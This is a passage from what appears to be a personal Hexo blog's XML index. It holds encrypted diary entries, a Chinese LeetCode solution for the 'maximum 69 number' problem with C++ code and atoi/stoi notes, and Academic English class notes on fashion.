5f45b4f5dcdada234ee39274a44b0fc13ee5de2dd95af83cae338bb182f89e2ecc6003884e4cd12b4bed38af60e525cce21da38c91bca20317bf10ca0631c22de154d32a1c2bab573737370aa14261607266102d630cc53f8066a769ffa06a3badc04e463961c53e0357d4ddc1208d2a12ff249eb3825fe73d968d8581c1ef4d2904bb1bf1de1da0c1f2e728ad60d2b6671822c6c508a0fbb4cb86907d1955dc08102e4857e878771b81ba9433f2f41b227c5688b8ecc029a94b9d4359fd11fcbcf0c3ce4f453c2e4d3ce31b899a7940e3c4e7c9bda1add35a5004920804ad7264232d8468b56d666038bdf55d5e8dc9d439c69f400f9e9b909f41ad8d68cdf55a816c3625ad8167a55d64268f69fabeb3793bf597a35f0daacf34611042e92f79dde</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>If you get tired, learn to rest, not to quit！</title>
    <url>/2020/11/17/2020-11-15/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="18f18ea0add828b8e1f6b2336834de6d11290a4195820d9833fcba37fa225bb3">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec9c798fdc4826f2eb5f6b0f6270424e00cd4e4d39876a7524994615db262a095254c1f9392154768735bb9867571ab2152b52b9f4328ee998da294aa9b019911fb47147b3477470ca2397027ea4a95494b05674bd96a316f025c6023c0078622a967412d468be3e8fba0b6858c072b70cbd54881d718787a37acf1e38bc115b74967342cb3482ab297a18dc6b4062f18ea20133f6e9642a71c0a5d80218a6a95dc8f84a8b1b2552e34042b852dbdd0a22493f53cf7845655e0a0af3993320b1cf0d2b090d19acda346360c2f778a43892f4ea2bffe29cb832f3c99023b04a57933aa52120e119f20cce5e81692afaf794ab69185b31b6fc3050e5fa0614ccd015ab559a64ffbfd46472451ca51caa0fbf8b8b78b843a477feb272d6daa31ef0dae006bda9d2c58241afc345c54a8c1bfa466c4c81955500a63807f9965855b2386bb1f72c2453f235246d22892160ccb2fddbd627384699c1e7e8bb4c9bb5c2294c12c90a5443c03dbe3747061c8d441155f52cbd272eac6144216218699afc75efa31c7a693b96703ba3a198c5866cc4ffa7e4d6f1a530e8f16f5f441e4671bdf3e86b308ca20a98c2b61fd28e404109ec3143109c14ca678b793856b39d223f51c95f3f3370db0f7a51fd88636bca0e9c43a23855dac53c7f80ae2c9469b195394fe745746d54038fef53d66d880fac7d08e823184bac92b38138c0ed976d5b861cc27fb876765c23b54946ddf1e74737af5726c72f8e3dd8e2bcd8a396909db03732a3c1443e35f9d4076c4e6677df05dff89f0852622e90363366b12397f0ee040c1939bdb4e8456df6d1b76fd2b1b4a947ee6e0750d582a8ec0c878312ae5d3bcc34150f5a00e20fabd67ec75a8ed445b88e663cabad221f560bfd924ed8aedd40037a9df6cbfc6223be830ed47e0b75e550957a3ca40916d902cb220f7bca95c0de4fc8acfd5946694bc9ffe852143c480b010c23c59478a946194598d3a0a90e6c60b4b79a61ca0dba1fd3306eaedaf928dfd46fda4a356bca757e5fd542c54209299a7b3f1dda1bf22c3cf11364a775e0648700fcabcce414065abb16616962b0aa7fd90eb258dfe2e5a68f502fa5c1861112128f33e10d7b5ef351d331cd0180da96239ebe008b2da70fe3ea26b0a1cc3e5da7a85d9d28bd19110c21cec089d3c70a08ac343833ca708443a4c8209130935c1228d5d10e966047133ae966326bd41e334f51dbfe9f9282d30563610c8b075a3c7f2eaf5f9133513c466edcab3ddf6490e1cea5b3de78d24c47abeda7a9f317ad972b6b31d359a86399e0493e37baa0d282274a3691cd67824c52031820af7e3a02766ae6b6d384806fe25653e99bdef7803d3e570cc680a709ecca0dc89a7974e5fa7aaca5e645c95aea261d5dcabfecaff373ab89524cf1ded4721654fe537d5e8318621e6144a003c20e3ac257e2a34421fbec0a3398284865b7aa0bc658fce2c84a36fe695500b325ff366575021d6651ffe32f7b827571ebddb20e2d4bd76b22629dd6325587e6d06e48050f9c331a917558c94454fb8a3c63b1208496458b26f165ebae4f809e3a17cd391814999e5d215f0476ef4366fb2cc58e823279ddc7d539b977dc238c16b25a2b4cbb97c1b74230efee6a748fc16be74fa23afddfba71b8838b5bc67ea54065dec10b62b99052628e92e85ecdd1221a7791343dbc8e8f23a3d537724ab60884b05558f9e201fd5c73910a7a68db996f0a5afd1f8c147a26fcadc82274b4243bf036bba1109394f1356c1149c2520e1f5182eb87059ff3c00cb96502dcb041e5498a263f1b462e4696e8ca801e676d43a58bb66c5cfcb2e1fce49219f82fdf63b63a10a1f6ba5f63891fded172ad7184dc3d874d35e86cbf11aae54e6f1beb332c7f067aea674c8576bf7e4cec26157f2d3241292b45d8082f8a471d0883d52bd9fdbe4ecf774d74e9bfd93468e25cf24cfbe715c665aa01606aaeead401f9061430176b2b2d9670aac2078a26bd5bf0ad06b0ef932b255ccfb4db2abd79a68d9577bca6505757d346ac97e2ba17660744819c1ce38c70f63e2c6c8487c7e2272894224d4f800eba6d60a604e47a9db33f0f02273972c8e45a427ee06d7a858a41168f1f637b7b4ad7a5b3e90f7dccd42101e5556017b6a9d5bb1062fc4db6d3b26c4478703be68972eaa2d5059a6db11d79f8a830f902e355ed068bd7193e31208226ae15a942c2a1909e93275efd075eb70c0cf7ba895a6ce71e434c8cb6f24ceea088537887c380b7db968ba0e69f5aadc27aeb7ca8edfa871dbbb9b8c00b23945d0ff5f69309a6f990f76c9021289fbded4b139e3517bd888f4ccaf4bef500d2fa19827f3fab95a67c055d76d04dccdf4d9a8630b9e9b044ba7eef0cacf5556ce929add732fe1870df901dc9af7fbfaa09733956068982c6cdbd8220dd67aabaac3d59043f0993f5ec711d925af14c4956f9754257f4858c11e5d45f25bab5569568e7ec6040b1f3da8067c908a99b57b38054717c13a71389c4ce8a37b9acacd372f0afa03dc0059f0330db952a22facf4acdb4c6fc821b1db10076b517406ee6c9551d6ffd7b60a73f4765999733b3e4b6a0f856934c4e1cdda60dfe5281809e7a0a572fab439b95f1423558fd91d5f18464cf83617335ffe78c1e834915bba41a259e63bd7ea94fd2c561b40cc9fca114254b645da042d0bdf80abfb5256ad11b344d64e936826310a6870a6adf4768f5d2f51549d5284b46f995f87a4c320137c796faa984d725970016e57588079b4a929bfc88203179dc9d26dbdc67ccc06a9dbe83db1a8f27dc1d9bae9f002b449df4e835949ff183534945e974928658dd1c36b4d412414529d97b31df453938684106c3299ef25d1e53bdfd5311fbb430c86ae372358eafd653b5b6f5dd8759a88f5dc787b0df90c0aa29143dbc694350e204c71d6449e1aa8182774f2ee5105d0094ca0469b52b43470167f194de1b92d7383891c62e32f99453ec48dfc80346cc0e369bc05ecfa2d8c33b2ec93b61762715e9db8832c28e3ec65c994cc6515558634d4df7915d6bd7a5217baa6350c4d31528d37a13ca2a194212fdc4fc6cca59860a8843d869dc075c800a223b679eb9d6af8418ff54ad518b31b975c0fe64c2c47a2397ff799012534fd5bce9f4d0df69ea79fd4ca240478f3a2f742d6904bd1358d20ef530ef024e29beb8d1c0c4bd4a8296f820f6ebd461b2bfb5ae3493168dbe9882c2ed237c9365dfb40fa3b8833deced459b3494d31286ef963540f62b40c0ce4d69aea558c69fee0feba555953b920a218962b3e7407f92ee211892046af7e19fa43239215e643126910e8224e2532f2b53bf4ebc421606b7304ea27b6e9e22cd835ea9130d82e817b66f60f2ee88668f65b512ecf34aaa2e73f0f3b95f819876d233430861108d3a5cf720ccce223959c3b7253a06a222ea32aba01d281e52bbbe58d44b343e05c483416a7bfa4196a7987a0397227be2444d2143a3d1033b6793ace9d4a7979667db44d37f15a788587e065572a4bd597c5d4d0281e1fd44648a83142e360ba3452b6ec0c514161a85e999cdcf4629521676c3fa8a9831bc821e6255ff4630f38938f4d55193adaa85320ec813e5ec06bc8f7c234005e613299f50bd6fea70ae25f828c87b86b79e8707f6210b9c12348590172d7a4000692115e7f8ed794733539a26b8d47f20e7d0134ad13ebac50bfbd0953eb3310cc7c801609521d097c06b7bc3a858c028b3c9c1a3d8cc19f60cbb259d801d7dcd0c36ce1e93383be1fea800429c444fcefbc9575a4f03019390afb647e4c9b61eca468019223957ef85bbdc40a1815b21b1e5832fdb69e6068ba2165d5f5ac16e3062362a4b9d7ef7a08703955b8d843af877cd998e6632c7f51c3a18e0891d22429b1eb2ca03357c90685df3c6fc9a73dd99c4b2a21e09c6094d7bffcec33531d0df65bd9cabe374dfc5b9ecb345f1db23c8d1e6eb8ca206a2807dc562c9204447672e517daf91c70919fc49b49e4f7bfd75916a5d9f58e2d68c2ab4377d02b078c1721614ea0a10c1c25d888dd4bdee5ad6538fd2b434eac8962f3d0762d4e8e87f12dfef9363c629d3f5ff1393ba631d9dcb4dc054fe006ea578af37e5547b4833a894d918748d17c1eb7a172cefae0a9f2a22d50954e05f27868d7eb7ef377ecf03183c196f68fe06010bef2baded33e3bb6454b2ba75e22b8ffd223df48010c9dda03a45ca4b3200da427ad48fad4d520f3444a3d59c0397d2a36bedaad980febabeb9b7a2536dc041e1b8cdf06be268c2fac1d4cb681b04104b869b616b3213bca12da510059d2402403d9f990e48f0746c554f915d5a199459940a6dd030ac5e143fe49b98ec215f7aa2afbc4f2bb0b79e51437b360b47f1a9d4eec6796ceb7b528b3914b3609903096964c8271811a28a17db96d93d3f2d93f89e27ea31535ff83240148c3084eda01f473f6e030535c7163befcdb3c7e8e96e6c989685f3d72dc67f9086ce6ab93012a50f6c37aab8e3b622cd90108d62e73b8a388bfa14507eb557cab7af4fa573f72368bc1592af711251671db800b18030f6c50a26e63afd08c70400a830bdc518e68df2a31e11b14741d48cd259ce7453cd243681af1cfd0162618cc521a6ca51bff6f915d9e09c34e3104311d6cb632e3e89c79ea18c36d005deff4b76471101d9d2abbfc821fab5e6df64f1c3a7113f3ed5f3989d41e05e62fae633eec3026cbc5de4600453e6c55309f1f852052aef63709a4eff838e6c05d1c135cfae9421ffa3ab2b3ba0a2b176f5f342bc7767b8681279295a724010e7</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>Try your best when you are young.Never regret！</title>
    <url>/2020/11/23/2020-11-22/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Welcome to my blog, enter password to read.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="a94d3524cd495ec8021e482add1f961be23de66f10c8ceff9f274c70eb437ef9">04b96cf03f1b5d00286d72390b6bf2e0817acbfddb7147d2fcc01912c7f5c0f9713c9c317ba53b9347fde83c930f8c77af411014f8ec84eef7465f6027f6e56361da453a696c51ea2cf726ce74f4d1f870ba487ed6f2d242104af5c0877116b7f14bfb7a90c5973d12ee403d2035f9933239ae2447ed66790333bdf54ffb591262e25fa12dbcf137d44c19a6cd948ebafb15e73fa6eff6dc060b9040f5fe74ceda47dc32b97d576023487f051b3ba548d6ba50e2b500f2040aef18f59839ab6e1e75f19b19b2197541d212a3b8a50be74d4dcb775f19746dc5f65bb1d14038106d809a8f516785e6e320975209525d369518b3e93b5bec268679dda1396e30afe69c8f882a0bd5eacf54f501c1e3d2ec9c798fdc4826f2eb5f6b0f6270424e004d46c1233559a51465644755355a27be5ce1635cadb78515ac23303a401eac295f20fcfefec844d9f5eedb91acf8343283f240d7deb9e73d6a85a8a7b267f024c7c517d8c33f8db0f0feb5037d45695f1e2b5be8fac659c61ec77ebeae1ddc6647dad61c6a195a93aca2bc3b42115aea1fb4d1afd0c588043d8404ed6a43d20ca6712853ca813d309bfd660442692d48b0b101a6309dd48069bccfead0ad3535251e3de4526270deba187def95a0659b5140c4a145dcb152c0c66c56cf287da1d92f64f09f2d943dc0e89d8615a474e7c827932773cc3a7144422f6e28be99ded76ec41837e89e67e87d6847faaf74294147184040d79584447651f00bf6706bb8171ed8fa55edb15f0dbb7037cdd6b08653a1cdcf43af547457fceaae33aa66b774f6bfedd28c1ab98b8d6edd8c88b3a840388dae3caeab1dfdf47a3c5e0ce8b982fef9ad2131ebe628004b6108811eff87da83948345d9a0c2dc7a20995787e09483917fd0477b974709df01e6d6fab271dd3e6c19e2a57a181eb335691ff5cdd7794dc6e6b9c41a9cd147ffe4e51df84baf994bcb1c8dc9b9b642f50e54e7d96aa543ffecd496ceebde2d8dfcce4c541670c15b297117c30b01e8388e6bae6912c1e2cb35a6db77668c5ae7e0ccc2e16d72fe33737feff9babf374f04f42598f01c2e5a85010da38fcc9acf050b6c24e664fabeed31d7c817cbcc46e950cae5675139941ae72aca6565cf86e82cf1b46cd4969af040de64896e7ec42d37db67025054875a6dd3914ae41f039acaeebef210ed95661880793221c2aec7a2ccb9c79201b02943fea63315b9da8d1cc5b372c32dcf75290a870526aa0f44beaa9e63f62d4469205c8647ee6dc3a6ad8995d7bdb2c4b276fae3415f24629e6de67678c18c98da1159ef077faad2a9b819572873e6505cf052997a095a469312fd4e8197ad124d63263c871cd3877000270a8d6af33a26c2dd6fc6cae6888af1adbfb25df5c66ae1c9f246d4cd67bdeb8b5cf99aca1dcf3430e7f2be696e06aeeb17e9d51fc633c96eb636ab440ee81d08a2df90156e6ab1fc19c1dd5b1afcc7ae1c2f7b564199fccdc9eef158c0c495c56b4e53a912f20c084ba58a7d4dd3adeccd9bd4f3eccf8cfaa6087cd764d8e7aa03c79b84055a07e95922a21cd49e9929b9de4ef4646aa79da0704f1b743352ffccb8c0285224f954892ff8f42dd0eb0b5b7f3c19893faed086c389aa299e37dbabb87f5acd1ab388f449c1098bae26bd653d7cc8c89f29253341a20dc7a3cfac5b633c8b1302a3a7b37da3aee3e3bc95332e24d1456f41c34eae7328d86ee7b3e68972ffeed3a947266e1144af30fba61df0f58d8eb3899102aa24333ac4fe165924366a9c6f09a643feebdc864d8236be4a8cb867cbe682dffca1be34f1605458dff857f37596b72ca8f169a9d2fb1fc7493f52b4623f24dd53a815706d85b2479228d3ee571c65aada652e9cf4eb467991bd439e88ac24d26c5546bd09a1f842e9402627d9c3869c08df31dd733c28bdda43bfd8ef3f8e977a000983b8951f1d51cfb5c00e478b7ef43e0a8cb805993c7c0804131e227604ec8578e7d5a34eaf3ba782e90e15d1bc33e8b8dc27b75a514fe4298afe2edd8a95f30673d667219110bd854b93cabcbe1777f512f8cc22e010e6ed2e25c43306414cfc634c9fe909f8cf3fd942f425c2d8a73e43d6570b829ad7555cdaaf36b69d54d4aa8fe16556874d3ad4096fb582bb00c6af8d3e4cb5aecb061720eeecff0c553a9cb8c7def4fda6c6f855573eebe20a0c54918cce58a94076b2d00c7e5b7a44691bddcdae1a55efe081e154f3e9d9a70e991dcb2e577421ab2d097ef32748f0babeb1bb3172d6cf745b7c534c406d2f9834634953b06836f4743e3df47760e9d026a83b0bfdff05baa8d2f2c7dd8b87c935b376d69cb48cc9c4953944fbf0e33d489650f6aef2f9ceaa808ad76ca617307d62e23eff551d7a68e489185198a3b4fc57c5b910841941669c2f14e8767e1a65872772009e8c0e7b15f4d8578fe21fb8b6a8ff61fb2610c2cc92e2c95359be96617d2c765bbb9b3d54bc55ef5775f01a4f3a72fe0891b5466c38bb314faa1a25bcf64c21ca1f91eca41957d14ad277d6ae972bf2cc08ab14c02d6516e5fdc532c005ef9aab2f32040208ae3ebdcce752ecbc053c93f9169f99b4bf64f587b0416000d4128d53e4095545f512f5d68bac491c7bd7ac0c1da59bc269be1ba4ef714e35e6d1437032a18d1f8644d978e5d14943cebf497299dbbd7cc57620ed1388621ae7e0d39e49c807ecf3357df9d349e225dc8685b06538510fa7fb7a7c070f173d194f3fe5d514af58870dcf1a52675620d17df3dc4105a3764a25057546749ce2b3dd02e55bb54e152e18da2643886955a1dde38eb1b82ba74c12cb123c8476ea56a99f8a29eca0976938217a020fad960475024f75f329b1bb684df1f2c052af7c5c101f5acb8459213c106a9ce475ddfbc4baca9a43be7566e4a58a3c01f51f2bf78d56e5ea7ec663daa8a52083e04e717418678927d517dcf1a64e855d0969997c5275e3338dc5ba2ae6c7141bf68611be9a3cb699e981c9bb663fe027e7951dd720d77bc05dcce594907889ac04701e9200fc34d117742d557533ca5330d42d1f0f1f014da2429a26806f74b2a311071a7a517b85b76e028c730ae433695095bf0b31d1d444480f162501dbc2831da60d95ed3a861d17670b663a1888be9104ac03837a53cb13366c75ce1a48f54819e51744f62d18bf6cb7e1b78895ffb6ae9cce369174310a7abe8683bace31cef98ea666834d4e66ea988862eac25f8f4bf14c75c20d7fbaa45a3907a8aa5c478d777b109eeb91665690003a315f7fdba147f70deab5fb1030d9374d48a1b14306ecc03c81a6cc2704444ccf648f3649a0602b3c1fac988fbf43bc9f1ea85338c570a1fcc053c0103a224f98001881d7fb0817e0b7901742cb1a0513c3589e0eb6a8e50fafa132d0a7e0dbc520cac333d4ff78a5d449e98e57d9e6764d8205a9a391f85d3b1ec872edfd6cf81b0a973f79a75acf008d894cbe584f296ef43e879559c63c54c6b1a2ebfe7ecac730a63aa0e177bf6fc9cb4d7a965b654a736a6fcfb3f555780498ecef36cd801741ad7dc287d5c7e274688aefe88bf8f7ffbc90fd4d74502e561ccace9722aafd6b1b2ec2ff0ffb9aa57498471d5352eb3ccdfc9137e88203da907b448a357b4da043c73d23a0cd375039ff5ab0dbaa8254c60b40b5aa902d12de4e2a6ab9cfbbe389d6a7c2397e7df5ed7cf15dfd8d522c3ec8f51d67c255cc282a13a031b26818bf12028bf4114e10177ea6e9a95a46e1ed8e0700ddd2db49c3cc805efcd459a9bfac337f46381486d37547ad015e308cdc8f148f9a775d5203d5bad31e98c3a6f4710512c5cb8d277cea1dc265fb6579163bdc15d60989451b7a32a4b49e469054bc65953631b27adc64b2dd688c0026befb5b66a9c4830d8fe61f7a648145fb18a252d82c7d5f3c2e17722e955134701da346f7d7badb33cc3ea04b394a4755e36e6a1fab9cb7bb2d6270c57e2578bb72c0db47288676cb2a6fb59159b142588c848c87b24f6fe7c4a7ca28f348bc34f4d047187e7fa5a56f22e62767a91c8b1c4a89d2460fc6bab9c4c6ee313285b7fb2f2bfe67c74836fad3959a6725f2d7b4c1c0b412d544df525f8845a250641fb509e3ac7872c413825ab4221c2ff38ea5244cc422b111021247bf1bad1564ccd34695ed8a982165f4c1e681c5a60f622d874f5c7c007eee67144a75f560ff8f45f367f51fe4d8013fe2488b5d22c469fdd7cc5ac8d7b7d28e5970c43302e9ad8cad6b3b38f851577a48c5912a8f3b15a40b8395ba4e56d423417d89d5de3f9fd599e4a00aae0031d5378c952d8d42775d392722110fa749377dd2b855ad55163df9fe09e8fa10adffef380d457f006c19512bb3c9e5ae1a9e5a5251062195ed19a4429e9bb597ab6bac7a3708f2d520a2875db3c4fe6da760756ead390545b164d598d479d65c15ad312421ecd052469a53171890baab5039f8b03237cf54437cb0fe888dec44ae39540fde2b51c8387d91f8047ff298f03d5f4261dbada9a409911efae45dc77e2ebce945ea4ee07d1ab35bbb2120c46bc62e54a31bf82a49335de33f47766e7b66899aaffb251d4b37050f5fdb41e94a8a2ad22a028f7c0abc0340</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Diary</category>
      </categories>
  </entry>
  <entry>
    <title>6和9组成的最大数字</title>
    <url>/2020/11/13/6%E5%92%8C9%E7%BB%84%E6%88%90%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/maximum-69-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个仅由数字 6 和 9 组成的正整数 <code>num</code>。</p>
<p>你最多只能翻转一位数字，将 6 变成 9，或者把 9 变成 6 。</p>
<p>请返回你可以得到的最大数字。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9669</span><br><span class="line">输出：9969</span><br><span class="line">解释：</span><br><span class="line">改变第一位数字可以得到 6669 。</span><br><span class="line">改变第二位数字可以得到 9969 。</span><br><span class="line">改变第三位数字可以得到 9699 。</span><br><span class="line">改变第四位数字可以得到 9666 。</span><br><span class="line">其中最大的数字是 9969 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9996</span><br><span class="line">输出：9999</span><br><span class="line">解释：将最后一位从 6 变到 9，其结果 9999 是最大的数。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：num &#x3D; 9999</span><br><span class="line">输出：9999</span><br><span class="line">解释：无需改变就已经是最大的数字了。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= num &lt;= 10^4</code></li>
<li><code>num</code> 每一位上的数字都是 6 或者 9 。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>将整数转成字符串，若存在字符’6’，则把左边第一个字符’6’变成’9’，这样可以得到最大数字。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败29.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximum69Number</span> <span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//int转string</span></span><br><span class="line">        <span class="built_in">string</span> s=to_string(num);</span><br><span class="line">        <span class="comment">//把左边第一个6转成9</span></span><br><span class="line">        <span class="keyword">if</span>(s.find(<span class="string">&#x27;6&#x27;</span>)!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">            s[s.find(<span class="string">&#x27;6&#x27;</span>)]=<span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//string转int，atoi是标准库函数</span></span><br><span class="line">        <span class="keyword">return</span> atoi(s.c_str());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/maximum-69-number/solution/6-he-9-zu-cheng-de-zui-da-shu-zi-by-leetcode-solut/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p>现在把 <code>9</code> 翻转成 <code>6</code> 是不合理的，因为它会使得数字变小。因此我们应当找到 <code>num</code> 中最高位的 <code>6</code>，将其翻转成 <code>9</code>。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.2M，击败11.53%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximum69Number</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> s = to_string(num);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span>&amp; ch: s) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;6&#x27;</span>) &#123;</span><br><span class="line">                ch = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stoi(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(\log \textit{num})$，表示 $\textit{num}$ 的位数。</p>
</li>
<li><p>空间复杂度：$O(\log \textit{num})$。为了代码编写方便，我们使用额外的字符串来存储 $\textit{num}$，使得可以直接修改特定位置的数字。</p>
</li>
</ul>
<center>🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓知 识 点🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓🎓</center>

<h6 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h6><p><strong>atoi()和stoi()的区别</strong></p>
<p><strong>相同点：</strong></p>
<ol>
<li>都是C++字符处理函数，把数字字符串转换成int输出</li>
<li>头文件都是#include\<cstring></cstring></li>
</ol>
<p><strong>不同点：</strong></p>
<ol>
<li>atoi()的参数是 const char<em> ,因此对于一个字符串str我们必须调用 c_str()的方法把这个string转换成 const char\</em>类型的,而stoi()的参数是const string*,不需要转化为 const char*；</li>
<li>stoi()会做范围检查，默认范围是在int的范围内的，如果超出范围的话则会runtime error！而atoi()不会做范围检查，如果超出范围的话，超出上界，则输出上界，超出下界，则输出下界；</li>
</ol>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>模拟解题，需要注意字符串转整数的两个函数stoi()和atoi()的使用。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>AcademicEnglish_notes</title>
    <url>/2020/11/19/AcademicEnglish-notes/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>There are some notes from the class.</p>
<a id="more"></a>
<h3 id="2020-11-19"><a href="#2020-11-19" class="headerlink" title="2020-11-19"></a>2020-11-19</h3><h6 id="Topic"><a href="#Topic" class="headerlink" title="Topic:"></a>Topic:</h6><p>An increasing number of people prefer to wear fashionable clothes. Could you please analyze its possible causes and effects?</p>
<p><strong>subjective reasons:</strong></p>
<ol>
<li>好看，增加个人魅力，更能吸引别人的眼球，引起他人注意。</li>
<li>攀比心理，盲目从众。</li>
</ol>
<p><strong>objective reasons:</strong></p>
<ol>
<li>社会环境，生活氛围所迫，时尚的世纪,人们都被时尚的气息所包围.在纵多的时尚人中间…如果你仍然保持原有的纯朴…只有被伤害,被笑话</li>
</ol>
<p><strong>effects:</strong></p>
<p>advantage:</p>
<ol>
<li>可以开阔自己的视野，增加对一些奢侈品的认识</li>
<li>与朋友聊天时多一些谈资</li>
<li>与时尚的人有共同话题，认识这类朋友</li>
<li>激发自己的上进心，从而更加努力学习、工作</li>
</ol>
<p>disadvantage:</p>
<ol>
<li>一味追求时尚容易使人养成随波逐流，盲目符合的习惯</li>
<li>对于学生来讲，一味追求时尚浪费时间影响学习</li>
</ol>
<p><strong>oponion：</strong></p>
<p>每个人有每个人的追求，现在生活越来越好，追求穿衣时尚也没什么，不追求也没什么！但是一定要有限度，比如难以解决温饱却一味追求奢侈品，这是一种不明智的行为。</p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>Handicraft_RSA</title>
    <url>/2020/10/14/Handicraft-RSA/</url>
